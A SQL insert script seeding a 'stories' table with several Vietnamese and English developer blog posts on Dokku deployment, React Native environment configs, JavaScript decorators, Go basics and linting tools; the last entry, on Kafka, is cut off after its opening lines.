SET check_function_bodies = false;
INSERT INTO "stories" ("title", "hashid", "user_id", "status", "preview_image", "preview_content", "contents", "published_at", "created_at", "updated_at") VALUES
	('Triển khai một Ứng dụng Rails lên máy chủ Dokku', '5OXLAoaY4Gr', '1', 'public', '', 'Giới thiệu

Triển khai một ứng dụng Rails có rất nhiều cách khác nhau, có nhiều nền tảng và công cụ hổ trợ cho việc này. Một trong những cách đó là deploy ứng dụng ứng dụng rails lên một máy chủ được cài đặt Dokku mà mình hay sử dụng đối với khách hàng vừa và nhỏ  ở TakeIT Vietnam. Bài viết này sẽ cung cấp một tổng quan ngắn gọn về Dokku và cách triển khai một ứng dụng Rails lên máy chủ được cà...', '## Giới thiệu

Triển khai một ứng dụng Rails có rất nhiều cách khác nhau, có nhiều nền tảng và công cụ hổ trợ cho việc này. Một trong những cách đó là deploy ứng dụng ứng dụng rails lên một máy chủ được cài đặt Dokku mà mình hay sử dụng đối với khách hàng vừa và nhỏ  ở TakeIT Vietnam. Bài viết này sẽ cung cấp một tổng quan ngắn gọn về Dokku và cách triển khai một ứng dụng Rails lên máy chủ được cài đặt Dokku một cách dễ dàng.

## Dokku là gì?

![](https://images.viblo.asia/d045f7b7-beb1-415f-8f61-0bd5a181fa5c.png)


Nếu bắt buộc phải thích một cách ngắn gọn về Dokku thì có thể mô tả Dokku là một dự án mã nguồn mở Platform as a Service thay thế cho Heroku. Dokku tận dụng sức mạnh của Docker để có thể triển khai trên nhiều loại phần cứng và trên các máy chủ giá rẻ. Bạn hoàn toàn có thể tự kiểm soát máy chủ của bạn và tận hưởng các tính năng nổi bật tương tự như Heroku. Ngoài ra, Dokku hổ trợ khá nhiều plugin giúp bạn triển khai đa dạng ứng dụng hơn.

## Triển khai một Ứng dụng Rails

Quy trình triển khai một ứng dụng Rails lên máy chủ Dokku rất đơn giản. Đầu tiên, bạn sẽ cần phải cài đặt CLI Dokku, đó là một giao diện dòng lệnh để quản lý và triển khai các ứng dụng. Sau khi cài đặt, bạn có thể sử dụng CLI để triển khai ứng dụng của bạn bằng cách tạo một ứng dụng Dokku và sau đó đẩy mã của bạn lên ứng dụng. Chúng ta hãy đi từng bước nhé.

1. **Yêu cầu cấu hình tối thiểu**

    Một hệ điều hành được cài mới theo danh sách bên dưới:

    - [Ubuntu 18.04/20.04/22.04](https://www.ubuntu.com/download)
    - [Debian 10+ x64](https://www.debian.org/distrib/)

    Máy chủ có một trong các kiến trúc sau:

   - AMD64 (được biết đến cũng như `x86_64`), Được sử dụng phổ biến cho máy chủ đám mây của Intel.
    - ARMV7 (được biết đến cũng như `armhf`), Được sử dụng thông dụng cho Raspberry PI.
    - ARMV8 (được biết đến cũng như `arm64`), Được sử dụng phổ biến cho Raspberry PI và AWS Graviton.

    Để tránh máy chủ quá tải và xảy ra các lỗi không mong muốn trong quá trình sử dụng:

    - Máy chủ cần ít nhất 1GB Ram
        - Nếu máy chủ ít hơn 1GB Ram thì hãy [tạo swap cho máy chủ](https://dokku.com/docs/getting-started/advanced-installation/#vms-with-less-than-1-gb-of-memory) của bạn:

            ```bash
            cd /var
            touch swap.img
            chmod 600 swap.img

            dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
            mkswap /var/swap.img
            swapon /var/swap.img
            free

            echo "/var/swap.img    none    swap    sw    0    0" >> /etc/fstab
            ```


    Cuối cùng là một tên miền, điều này là không bắt buộc. Tuy nhiên, sử dụng tên miền sẽ giúp ứng dụng của bạn có thể truy cập một cách dễ dàng hơn là một địa chỉ IP.

2. **Cài đặt Dokku lên máy chủ**

    Cài đặt Dokku bằng file bootstrap

    ```bash
    wget https://dokku.com/install/v0.29.4/bootstrap.sh #0.29.4 là phiên bản cài đặt
    sudo DOKKU_TAG=v0.29.4 bash bootstrap.sh
    ```

    Thiết lập SSH key và Virtualhost

    ```bash
    # usually your key is already available under the current user''s `~/.ssh/authorized_keys` file
    cat ~/.ssh/authorized_keys | dokku ssh-keys:add admin

    # you can use any domain you already have access to
    # this domain should have an A record or CNAME pointing at your server''s IP
    dokku domains:set-global dokku.me

    # you can also use the ip of your server
    dokku domains:set-global 10.0.0.2
    ```

3. **Triển khai một ứng dụng Rails**

    Sau khi hoàn thành cài đặt Dokku lên server, chúng ta sẽ bắt đầu triển khai một ứng dụng rails cơ bản theo các bước sau:

    Trong ví dụ này, chúng ta sẽ dùng repo [the Heroku Ruby on Rails "Getting Started" app](https://github.com/heroku/ruby-getting-started) để triển khai.

    Clone source code từ git repository về máy chủ.

    ```bash
    # from your local machine
    # SSH access to github must be enabled on this host
    git clone https://github.com/heroku/ruby-getting-started
    ```

    Tạo một ứng dụng trên Dokku

    ```bash
    # on the Dokku host
    dokku apps:create ruby-getting-started
    ```

    Mặc định, Dokku sẽ không cung cấp các database được cài đặt sẵn mà chúng ta phải cài đặt thông qua các Plugin. Bạn có thể truy cập danh sách các Plugins hiện có từ [trang chủ của Dokku](https://dokku.com/docs/community/plugins/#official-plugins-beta), ở đây mình sẽ dùng Postgres nên sẽ cài đặt plugin Postgres được cung cấp từ Dokku

    ```bash
    # on the Dokku host
    # install the postgres plugin
    # plugin installation requires root, hence the user change
    sudo dokku plugin:install https://github.com/dokku/dokku-postgres.git
    ```

    Tạo một database mới

    ```bash
    # create a postgres service with the name railsdatabase
    dokku postgres:create railsdatabase
    ```

    Liên kết ứng dụng đã tạo trước đó với database vừa tạo.

    Bằng cách liên kết ứng dụng và database, Dokku sẽ tạo ra một biến môi trường là `DATABASE_URL` trên ứng dụng Dokku.

    ```bash
    # on the Dokku host
    # each official datastore offers a `link` method to link a service to any application
    dokku postgres:link railsdatabase ruby-getting-started
    ```

    Thực hiện deploy app `ruby-getting-started` lên Dokku server. Tất cả những gì bạn cần làm là thêm remote vào git và push source code vào git repository của Dokku.

    ```bash
    # from your local machine
    # the remote username *must* be dokku or pushes will fail
    cd ruby-getting-started
    git remote add dokku dokku@dokku.me:ruby-getting-started
    git push dokku main:master
    ```

    Sau khi chạy lệnh git push dokku main:master, bạn sẽ nhận được ouput gần giống như bên dưới đây.

    ```bash
    Counting objects: 231, done.
    Delta compression using up to 8 threads.
    Compressing objects: 100% (162/162), done.
    Writing objects: 100% (231/231), 36.96 KiB | 0 bytes/s, done.
    Total 231 (delta 93), reused 147 (delta 53)
    -----> Cleaning up...
    -----> Building ruby-getting-started from herokuish...
    -----> Adding BUILD_ENV to build environment...
    -----> Ruby app detected
    -----> Compiling Ruby/Rails
    -----> Using Ruby version: ruby-2.2.1
    -----> Installing dependencies using 1.9.7
           Running: bundle install --without development:test --path vendor/bundle --binstubs vendor/bundle/bin -j4 --deployment
           Fetching gem metadata from https://rubygems.org/...........
           Fetching version metadata from https://rubygems.org/...
           Fetching dependency metadata from https://rubygems.org/..
           Using rake 10.4.2

    ...

    =====> Application deployed:
           http://ruby-getting-started.dokku.me
    ```


## Tổng kết

Cài đặt một ứng dụng Rails lên máy chủ Dokku là một cách tuyệt vời để nhanh chóng và dễ dàng triển khai một ứng dụng. Với một vài câu lệnh là bạn đã có một ứng dụng của mình hoạt động trong thời gian ngắn. Ngoài ra những câu lệnh đơn giản bên trên, Dokku còn có thể làm được nhiều việc hơn với các cấu hình nâng cao, các plugin được cung cấp bởi Dokku và cộng đồng cũng làm cho Dokku ngày càng linh hoạt và ngày càng mở rộng.

Dokku có những ưu điểm nhưng đồng thời cũng có những nhược điểm, hi vọng bạn sẽ thích và chờ các bài viết liên quan đến Dokku sắp tới.

Trường - TakeIT Vietnam', '2023-02-09T06:52:42.000000Z', '2023-02-28T04:40:05.000000Z', '2023-02-09T09:41:01.000000Z'),
	('Bài 2 - Xây dựng môi trường DEVELOPMENT - STAGING - PRODUCTION', 'qPoL7zAkJvk', '2', 'public', 'https://images.viblo.asia/0ae1addc-06f4-469c-9c78-72beb0e6fc00.png', 'Giảm thiểu lỗi khi đẩy lên môi trường production

Tóm tắt
Khái niệm Environment files

- Các Key,secrets và config thường được lưu trữ trong các tệp .env , với các tham số khác nhau tương ứng với các loại xây dựng cụ thể. Bạn có thể quen thuộc với các tệp .env tạo thành phương pháp ứng dụng 12 yếu tố. Các nguyên tắc 12 yếu tố được dành cho các ứng dụng phần mềm như một dịch vụ-phương pháp này k...', '> Giảm thiểu lỗi khi đẩy lên môi trường production


# Tóm tắt
## Khái niệm Environment files

- Các Key,secrets và config thường được lưu trữ trong các tệp **.env** , với các tham số khác nhau tương ứng với các loại xây dựng cụ thể. Bạn có thể quen thuộc với các tệp .env tạo thành phương pháp [ứng dụng 12 yếu tố](https://12factor.net/). Các nguyên tắc 12 yếu tố được dành cho các ứng dụng phần mềm như một dịch vụ-phương pháp này không áp dụng hoàn hảo cho sự phát triển RN. Tuy nhiên, việc tiếp cận cấu hình xây dựng theo mô hình 12 yếu tố là một ý tưởng tốt.

- Để sử dụng các tiệp cấu hình .env trong các ứng dụng React Native (RN), ta phải thêm [react-native-config](https://www.npmjs.com/package/react-native-config) vào project của bạn. ở đây mình sẽ tạo ra 3 môi trường **DEVELOPMENT - STAGING - PRODUCTION**

## Hướng dẫn
## Tạo project base

Để tạo Project ta dùng lệnh:

```
npx react-native init ReactNativeDevOps
```

![Screenshot 2023-02-07 at 15.05.23.png](https://images.viblo.asia/0ae1addc-06f4-469c-9c78-72beb0e6fc00.png)

## Cài đặt và cấu hình react-native-config

Cài đặt **react-native-config**

```
npm i react-native-config --save
```

![](https://images.viblo.asia/52905fe3-1fb1-45c8-857e-11972f7f2c70.png)

### Cấu hình IOS

1. Chạy lện

```
npx pod-install
```

![Screenshot 2023-02-08 at 16.40.09.png](https://images.viblo.asia/5d25c95e-2c45-41a4-bca1-9bf63faac813.png)

Ta mở xcode bằng lệnh

```
open ios/ReactNativeDevOps.xcworkspace
```

sau đó mở file **AppDelegate.mm**

![image.png](https://images.viblo.asia/b9c5e25a-4b2f-4c1a-84f3-ccbb0a75dc16.png)

### Cấu hình Android

Ta vào file **android/app/build.gradle** thêm vào dòng số 2 đoạn code

```
apply from: project('':react-native-config'').projectDir.getPath() + "/dotenv.gradle"
```

![](https://images.viblo.asia/ed317a4f-8085-40ec-955e-602a0926f3c0.png)

trong file **android/app/proguard-rules.pro** ta thêm dòng

```
-keep class com.reactnativedevops.BuildConfig { *; }
```

![](https://images.viblo.asia/c804a7d5-0c7a-4566-b8a5-bc4ba305d0b9.png)


Tiếp theo ta tạo thêm 3 file ở thư mục root:

1. DEVELOPMENT (.env)
```
API_KEY=devKey
API_URI=https://dev.com/api
```

2. STAGING (.env.stg)
```
API_KEY=stagingKey
API_URI=https://staging.com/api
```

3. PRODUCTION (.env.prod)
```
API_KEY=productKey
API_URI=https://prod.com/api
```

![](https://images.viblo.asia/e9bec63a-b759-4801-9518-d6a87d040a49.png)

Sau đó ta sử dụng config bằng cách thêm vào scripts trong package.json

```
{
  "name": "ReactNativeDevOps",
  "version": "0.0.1",
  "private": true,
  "scripts": {
    "dev-android": "ENVFILE=.env react-native run-android", # <- Thêm ở đây
    "stg-android": "ENVFILE=.env.stg react-native run-android", # <- Thêm ở đây
    "prod-android": "ENVFILE=.env.prod react-native run-android",  # <- Thêm ở đây
    "stg-ios": "ENVFILE=.env.stg react-native run-ios", # <- Thêm ở đây
    "dev-ios": "ENVFILE=.env react-native run-ios", # <- Thêm ở đây
    "prod-ios": "ENVFILE=.env.prod react-native run-ios", # <- Thêm ở đây
    "lint": "eslint .",
    "start": "react-native start",
    "test": "jest"
  },
  "dependencies": {
    "react": "18.2.0",
    "react-native": "0.71.2",
    "react-native-config": "^1.5.0"
  },
  "devDependencies": {
    "@babel/core": "^7.20.0",
    "@babel/preset-env": "^7.20.0",
    "@babel/runtime": "^7.20.0",
    "@react-native-community/eslint-config": "^3.2.0",
    "@tsconfig/react-native": "^2.0.2",
    "@types/jest": "^29.2.1",
    "@types/react": "^18.0.24",
    "@types/react-test-renderer": "^18.0.0",
    "babel-jest": "^29.2.1",
    "eslint": "^8.19.0",
    "jest": "^29.2.1",
    "metro-react-native-babel-preset": "0.73.7",
    "prettier": "^2.4.1",
    "react-test-renderer": "18.2.0",
    "typescript": "4.8.4"
  },
  "jest": {
    "preset": "react-native"
  }
}
```

Sau khi cấu hình xong ta dùng lệnh để run test config

1. dev
```
npm run dev-ios
```

![Screenshot 2023-02-09 at 10.12.31.png](https://images.viblo.asia/9ffbfd3c-a5d4-4f1f-bfa6-8f8f2326f874.png)

2. stg
```
npm run stg-ios
```

![Screenshot 2023-02-09 at 10.20.43.png](https://images.viblo.asia/9e40289e-e501-45b9-9d5c-1233ab93fd1e.png)

3. prod

```
npm run prod-ios
```


![Screenshot 2023-02-09 at 10.21.39.png](https://images.viblo.asia/55126fba-be2e-448b-a2c7-b85624a3ce4f.png)

Như vậy thì mình đã cấu hình thành công 3 môi trường dev-stg-prod', '2023-02-09T06:41:25.000000Z', '2023-02-28T04:44:05.000000Z', '2023-02-10T03:43:46.000000Z'),
	('Blog#136: The Decorator Design Pattern in JavaScript', 'MkNLrOPOVgA', '3', 'public', 'https://images.viblo.asia/b88334d3-62db-4461-9754-344fc02d0ef2.png', '

The main goal of this article is to help you improve your English level. I will use Simple English to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but remember that the main target of this article is still to LEARN ENGLISH.

Hi, I''m Tuan, a Full-stack Web Developer from Tokyo 😊.
F...', '![image.png](https://images.viblo.asia/b88334d3-62db-4461-9754-344fc02d0ef2.png)

> The main goal of this article is to help you improve your **[English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** level. I will use **[Simple English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but **remember** that the main target of this article is still to **[LEARN ENGLISH](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)**.
-----
Hi, I''m [Tuan](https://tuan-portfolio.web.app/#/), a Full-stack Web Developer from Tokyo 😊.
Follow my blog to not miss out on useful and interesting articles in the future.

_**In this article, we''ll learn what is the Decorator Design Pattern in JavaScript, why its useful...**_
# What is the Decorator Pattern?
The Decorator Design Pattern is a way of adding additional functionality to an existing object without modifying its structure. This is done by wrapping the existing object with an outer object to extend its behavior.

# Why is the Decorator Design Pattern useful?
The Decorator Design Pattern is useful because it allows us to easily add additional functionality to an existing object without having to modify its structure. This is especially useful when the functionality we need is complex or would require a lot of code to implement.

# Example in Javascript

## Logging Decorator

In this example, we will create a Logging Decorator that logs a message every time a function is called.

```js
// Create the base function
function getData() {
  // Do something
}

// Create the LoggingDecorator
function LoggingDecorator(fn) {
  return function () {
    console.log(''Logging...'');
    fn();
  }
}

// Decorate the function
let decoratedFn = LoggingDecorator(getData);

// Call the decorated function
decoratedFn(); // Logs ''Logging...''
```

## Caching Decorator

In this example, we will create a Caching Decorator that stores the result of a function call in a cache. We will also add a mechanism to check if the result is already present in the cache and return its value without calling the function.

```js
// Create the base function
function getData() {
  // Do something
}

// Create the cache
let cache = {};

// Create the CachingDecorator
function CachingDecorator(fn) {
  return function () {
    // Check if the result is in the cache
    if (cache[fn]) {
      return cache[fn];
    }

    // Call the function and store the result in the cache
    let result = fn();
    cache[fn] = result;
    return result;
  }
}

// Decorate the function
let decoratedFn = CachingDecorator(getData);

// Call the decorated function
decoratedFn();
```

## Throttling Decorator

In this example, we will create a Throttling Decorator that limits a function to run no more than once in a certain amount of time.

```js
// Create the base function
function getData() {
  // Do something
}

// Create the ThrottlingDecorator
function ThrottlingDecorator(fn, delay) {
  let lastCallTime;
  return function () {
    // Check if the function was called before
    if (lastCallTime && (Date.now() - lastCallTime) < delay) {
      return;
    }

    // Call the function and store the time
    lastCallTime = Date.now();
    fn();
  }
}

// Decorate the function
let decoratedFn = ThrottlingDecorator(getData, 500);

// Call the decorated function
decoratedFn();
```

# Conclusion
The Decorator Design Pattern is a way to easily extend the functionality of an existing object without having to modify its structure. We''ve seen some code samples and can see how this pattern makes adding additional functionality to objects very easy.

# And Finally
As always, I hope you enjoyed this article and learned something new.
Thank you and see you in the next articles!

If you liked this article, please give me a like and subscribe to support me. Thank you. 😊

-----
> The main goal of this article is to help you improve your **[English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** level. I will use **[Simple English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but **remember** that the main target of this article is still to **[LEARN ENGLISH](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)**.

# Resource
* https://tuan200tokyo.blogspot.com/2023/02/blog136-decorator-design-pattern-in.html', '2023-02-09T05:18:15.000000Z', '2023-02-27T05:59:04.000000Z', '2023-02-09T05:18:15.000000Z'),
	('[Series] Learn Go Day 1', 'Rk74a2nAJeO', '4', 'public', '', 'Giới thiệu
Trong bài viết này, mình sẽ viết lại tất cả các kiến thức trong quá trình mình học. Get''s go!!!

Nội dung
Khai báo biến
Ta có 3 cách khai báo biến:

Lưu ý: Cách khai báo 2 và 3 nên dùng ở trong một function, còn cách khai báo 1 ta thường dùng để khai báo biến global cho toàn bộ code.

Các biến được khai báo nhưng không có giá trị thì:
Sử dụng điều kiện if/else

If rút gọn:

Các loại ...', '## Giới thiệu
Trong bài viết này, mình sẽ viết lại tất cả các kiến thức trong quá trình mình học. Get''s go!!!

## Nội dung
### Khai báo biến
Ta có 3 cách khai báo biến:
```json
1. var <name> <type>
   => var one int; one = 1

2. var <name> = <value>
   => var one = 1

3. <name> := <value>
   => one := 1
```

> Lưu ý: Cách khai báo 2 và 3 nên dùng ở trong một function, còn cách khai báo 1 ta thường dùng để khai báo biến global cho toàn bộ code.

Các biến được khai báo nhưng không có giá trị thì:
```json
0 for numeric types,
false for the boolean type, and
"" (the empty string) for strings.
```
### Sử dụng điều kiện if/else
```go
if <condition expression> {
    // implement code
} else if <condition expression> {
    // implement code
} else {
    // implement code
}
```

If rút gọn:
```go
func pow(x, n, lim float64) float64 {
	if v := math.Pow(x, n); v < lim {
		return v
	}
	return lim
}
```

### Các loại dữ liệu
```json
bool

string

int  int8  int16  int32  int64
uint uint8 uint16 uint32 uint64 uintptr

byte // alias for uint8

rune // alias for int32
     // represents a Unicode code point

float32 float64

complex64 complex128
```

### Chuyển đổi loại dữ liệu
Biểu thức T(v) chuyển đổi giá trị v thành kiểu T.
```
var i int = 42
var f float64 = float64(i)
var u uint = uint(f)
```
hoặc
```
i := 42
f := float64(i)
u := uint(f)
```

Nếu như chúng ta khai báo `:=` như thế này thì kiểu dữ liệu sẽ dựa vào value của biến đó:
```
i := 42           // int
f := 3.142        // float64
g := 0.867 + 0.5i // complex128
```

### Khai báo hàm
Một hàm có thể nhận 0 hoặc nhiều đối số.

Hàm Trả về 1 giá trị:
```
func add(x int, y int) int {
	return x + y
}
```

Hàm trả về nhiều giá trị:
```
func add(x , y int) (int, int) {
	return x, y
}
```

### Vòng lặp For
For:
```go
sum := 0
for i := 0; i < 10; i++ {
	sum += i
}
```

Continue:
```go
sum := 1
for ; sum < 1000; {
	sum += sum
}
```

While:
```go
sum := 1
for sum < 1000 {
	sum += sum
}
```

Nếu bạn bỏ qua điều kiện vòng lặp, nó sẽ lặp mãi mãi.
```go
for {
}
```

### Switch
Có điều kiện:
```go
import (
	"fmt"
	"runtime"
)

switch os := runtime.GOOS; os {
	case "darwin":
		fmt.Println("OS X.")
	case "linux":
		fmt.Println("Linux.")
	default:
		// freebsd, openbsd,
		// plan9, windows...
		fmt.Printf("%s.\n", os)
}
```

Không có điều kiện:
```go
import (
	"fmt"
	"time"
)


t := time.Now()
switch {
case t.Hour() < 12:
	fmt.Println("Good morning!")
case t.Hour() < 17:
	fmt.Println("Good afternoon.")
default:
	fmt.Println("Good evening.")
}
```

### Defer
Defer là 1 tính năng của Go,  cho phép gắn 1 hàm để thực hiện sau khi hàm chính hoàn thành.
```go
import "fmt"

func main() {
	defer fmt.Println("world")

	fmt.Println("hello")
}
```

**Stacking defers**: là các hàm được gọi nhưng chưa được thực hiện và bị đẩy lên stack. Khi hàm chính hoàn thành, các hàm chưa thực hiện nó sẽ được chạy theo thứ tự LIFO ( Last-in-First-out ).
```go
import "fmt"

func main() {
	fmt.Println("counting")

	for i := 0; i < 10; i++ {
		defer fmt.Println(i)
	}

	fmt.Println("done")
}
```

##  Tổng kết
Vậy là sau 1 ngày mình đã học được:
* cách khai báo biến
* câu lệnh if/else
* các kiểu dữ liệu
* khai báo hàm.
* Vòng lặp For
* Switch
* Defer, Stacking Defer

Cám ơn các bạn đã theo dõi bài viết của mình. Chúc các bạn 1 ngày vui vẻ. Tks', '2023-02-09T03:07:10.000000Z', '2023-02-28T01:41:05.000000Z', '2023-02-10T08:30:20.000000Z'),
	('Prettier, Eslint, Typescript-Eslint ,EditorConfig , Git Hook', 'GAWVpdEPV05', '5', 'public', 'https://images.viblo.asia/531a5f29-4950-4b66-9f2f-61d5d32630d6.png', 'Đặt vấn đề
Trong dự án có nhiều người tham gia , bạn thấy code của người khác nhìn rất ngứa mắt 👊👊. Nào là code không chịu format cho dễ đọc,nào là đặt tên biến lúc thì camelCase, lúc thì snake, bla bla ... Ừm mình cũng như vậy 😙. Nếu mình mà có chút quyền lực trong tay là mình dí đầu mấy ông code xấu ngay, nhưng tiếc là mình chỉ là cu ly, không thích nâng bi ai nhưng cũng không muốn mất lòng a...', '# Đặt vấn đề
Trong dự án có nhiều người tham gia , bạn thấy code của người khác nhìn rất ngứa mắt 👊👊. Nào là code không chịu format cho dễ đọc,nào là đặt tên biến lúc thì camelCase, lúc thì snake, bla bla ... Ừm mình cũng như vậy 😙. Nếu mình mà có chút quyền lực trong tay là mình dí đầu mấy ông code xấu ngay, nhưng tiếc là mình chỉ là cu ly, không thích nâng bi ai nhưng cũng không muốn mất lòng ai. Zậy phải làm sao để việc code đúng chuẩn, chuẩn ở đây là về cách format code , cách đặt tên, hoặc trong một vài trường hợp ví dụ viết switch-case phải có default, viết hàm phải có return, phải khai báo biến trước khi sử dụng, không đặt trùng tên biến kể cả khác scope ,...

Tốt nhất để editor gợi ý và tự động hóa 😉😉. Chẳng biết có tạo được ra value gì từ sản phẩm của mình không nhưng code cho "đẹp" để anh em đỡ lôi tên ra chửi đã. Đúng không ạ 🙂. Rồi mấy cái này thì mình thấy ai cũng nên biết không cứ gì phải mấy ông lead tay to mới làm đâu. Mình làm frontEnd và code javascript là chủ yếu, bài viết này mình trình bày cái tool dùng với javascript nha, ngôn ngữ khác chắc chắn cũng có thôi 👌👌

# Giải pháp
## Prettier

* **Prettier là gì:** Ngay cái tên dịch ra đã là "xinh hơn" 🤣🤣. Thằng này là tool để format code html , css , js , markdown , ... di dỉ gì gì cái gì cũng chơi. Anh em dùng vscode thì chắc đến 99,69% đều cài .

* **Cài đặt như nào:** Cái extension ở editor là khác nha, mình đang nói đến thư viện.

```
npm install --save-dev prettier
```

cài dưới dạng dev dependencies thôi vì chỉ dùng để format code hoy lúc runtime không có dùng. Rồi cài xong thì tạo một file **.prettierrrc.json** để cấu hình và một file **.prettierignore** để liệt kê những file không cần format.
Cấu hình như nào, có những options nào thì các bẹn lên doc đọc nha [https://prettier.io/docs/en/options.html](https://prettier.io/docs/en/options.html)
File ignore thì mặc định đã ignore các file **.git , .svn , .hg và node_modules/** . Hoặc mình có thể ignore trực tiếp trong code

* **Chạy prettier như nào:**
1. Chạy bằng command:
```
// check xem còn những file nào chưa format trong path chỉ định
// ở đây dùng ''.'' nghĩa là check ở con trỏ thư mục hiện tại
npx prettier check .

// chạy format code
npx prettier write .
```
2. Chạy trong editor:
    Để có thể chạy format mỗi khi ấn phím tắt trong editor thì mình cài thêm extension. Bản thân extension này cũng có file config mặc định của nó roy nhưng nếu trong project có file config thì extension sẽ đọc và format theo file config đó. Ví dụ với Vscode các bạn ấn **Ctrl + Shift + P** rồi search **Format Document** chọn format with Prettier , nhớ bind cho nó một cái key nha. Có thể check editor có chạy theo file config không bằng cách ấn phím tắt rồi check tab output
            <div align="center">![](https://images.viblo.asia/b253849b-c925-4483-9b5d-5504345cd7b2.png)</div>
           <div align="center">editor format code theo file config</div>

## Eslint

* **Eslint là gì :**  Eslint là một tool để cải thiện chất lượng code, nó có hai categories of rule là **Formatting** và **Code-quality**. Nhiều ae sẽ bảo thể cái formatting này có conflix với prettier hông. Câu trả lời là có 🙃, nhưng túm váy lại thì phần format của eslint không thể sánh được với prettier nên người ta thường dùng kết hợp cả hai thằng này với nhau ( [https://github.com/prettier/prettier-eslint/issues/101]( https://github.com/prettier/prettier-eslint/issues/101 ) ) Và dĩ nhiên vì có conflix nên phải resolve nó lát sẽ nói ở phần cài đặt. Vậy nên nói đến eslint hãy coi nó là một code-quality tool

* **Cài đặt Eslint như thế nào :** Sử dụng tool này cho đơn giản nha anh em , chỉ cần chọn cho đến lúc hoàn thiện thôi 🥰
```
npm init @eslint/config
```

Sau khi fill đầy đủ các option thì các thư viện cần thiết sẽ được add vào dự án và thấy xuất hiện một file **.eslintrc.( js | json | yaml )** tùy vào lựa chọn của các bạn .

<div align="center">![](https://images.viblo.asia/c55cac48-e04b-49f5-9c5d-8c5dc737c432.png)
</div>
<div align="center">file cấu hình eslint được generate</div>

Phần **extends** và **rules** là mình đã chỉnh sửa rồi và cũng là hai phần anh em cần để ý nhất. Đại loại
* **Extends** : chỉ ra cấu hình dự án được kế thừa từ thằng nào **, standard-with-typescript , prettier** là các thư viện được cài thêm. Thằng xuất hiện phía sau thì override thằng đằng trước. Nhớ ở trên mình nói phải resolve conflix giữa prettier và eslint không, chỗ này sẽ ghi đè những rule format code của eslint bằng prettier.
* **Rules** :  Mỗi rule sẽ có 3 cấp độ là "off" , "warning" , "error" hoặc 0 , 1 , 2 . Có quá trời rule anh em tham khảo ở đây :[ https://eslint.org/docs/latest/rules/]( https://eslint.org/docs/latest/rules/) nhưng phần lớn thì chúng ta chỉ cần extend những rule được recomend trong phần **extends** ở trên là ok rồi, cái nào cần override thì mới ghi đè ở rules ( comment rule trong file có độ ưu tiên cao nhất rồi đến ở field rules trong file cấu hình rồi mới đến extends nha )

* **Chạy Eslint như thế nào**

1. Chạy bằng cmd :
```
npx eslint <path to run > --option
```
Anh em thao khảo các option ở đây nha[ https://eslint.org/docs/latest/use/command-line-interface]( https://eslint.org/docs/latest/use/command-line-interface)

2. Tích hợp vào editor: với những rule có thể fixable ( những rule thuộc dạng format code ) thì có thể dùng editor để chạy format . Với Vscode anh em **Ctrl + shift + P** search **lint** rồi gán cho nó một shortcut để chạy format lint nhé

## Typescript-eslint

Bây giờ anh em mà start từ đầu chắc đều muốn code bằng typescript , eslint thì chỉ support javascript. Ngày trước có thằng tslint nhưng đã ngưng support anh em không nên dùng mà hãy chuyển qua typescript-eslint [https://typescript-eslint.io/](https://typescript-eslint.io/) . Thực ra trong phần cài đặt eslint bằng init ở trên nếu chọn option ngôn ngữ là typescript thì anh em cũng thấy typescript-eslint được cài vào dự án rồi đó.

## Editor config

* **Editor config là gì** : anh em code thường dùng editor như Vscode , Webstorm , SublineText ,... mỗi thằng đó lại có cấu hình mặc định sẵn ví dụ khi code thì dùng tab hay space , độ rộng tab/space là bao nhiêu , encoding là gì ,... Giả sử prettier anh để sử dụng tab , độ rộng 4 nhưng cài đặt mặc định của editor là dùng Space và indent là 2 thì cứ code xong rồi ấn format ta sẽ thấy code " nhảy nhảy " 😆. Lúc này cần đến editor config
* **Cài đặt thế nào** : khi trong thư mục gốc có file **.editorconfig** thì editor sẽ ưu tiên đọc file này và format theo. Nội dung file ntn anh em đọc ở đây nhe [https://editorconfig.org/](https://editorconfig.org/)

## Git hook

* **Git hook là gì**: khi làm việc với git chúng ta có thể trigger một số script ứng với các hành động cụ thể trong git follow, ví dụ ở đây tôi muốn trước khi commit vào repo thì chạy format code, lint check cho những ông nào code nhưng éo chịu format 🙂 . Việc này giúp tránh những lỗi conflix ngáo ộp
* **Cài đặt như thế nào** : Anh em tham thảo ở đây nhé [https://prettier.io/docs/en/precommit.html](https://prettier.io/docs/en/precommit.html)
* **Lưu ý** : Giả sử bạn chưa format mà commit , thì khi trước khi commit git hook sẽ chạy, nó vẫn sẽ tạo ra commit của bạn và format lại những file chưa được format ==> **commit --amend** cho những file đó nha

# Kết luận

Mấy cái này không hề màu mè hoa lá cành đâu nha. Mình thấy rất nhiều team code mà toàn conflix do format code thôi. Hy vọng bài viết giúp được gì đó cho anh em 😘😘', '2023-02-09T02:59:56.000000Z', '2023-02-28T02:50:03.000000Z', '2023-02-09T02:54:35.000000Z'),
	('Thực hành setup cụm kafka trên AWS EC2', 'EvbLbb9lLnk', '6', 'public', 'https://images.viblo.asia/dac0cd9a-a78b-4952-ad66-d338bc0de0ba.png', 'Tác giả: https://www.facebook.com/lang.thinh.146/
Source: https://github.com/quocthinh861/kafka-zookeeper-cluster.git
<img loading="lazy" data-attachment-id="863" data-permalink="https://normanlimxk.com/kafka-ec2/" data-orig-file="https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png" data-orig-size="1288,471" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&q...', '> Tác giả: https://www.facebook.com/lang.thinh.146/
>
> Source: https://github.com/quocthinh861/kafka-zookeeper-cluster.git
>
